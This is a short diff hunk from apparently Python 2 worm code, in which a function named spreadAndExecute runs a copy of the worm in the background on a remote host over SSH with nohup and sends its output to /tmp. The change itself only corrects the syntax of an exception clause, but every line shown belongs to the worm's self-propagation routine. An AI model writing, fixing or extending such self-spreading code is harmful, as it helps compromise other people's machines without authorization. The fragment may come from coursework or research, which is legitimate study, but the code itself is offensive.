@@ -282,7 +282,7 @@ def spreadAndExecute(sshClient, fromHost):
         cmdString = "nohup python " + WORM_DEST + " " + fromHost + " >/tmp/nohup.out 2>&1 &"
         sshClient.exec_command(cmdString)
 
-    except IOError, socket.socket_error as msg:
+    except (IOError, socket.socket_error) as msg:
         print "Error encountered while trying to spread"
         print msg
 
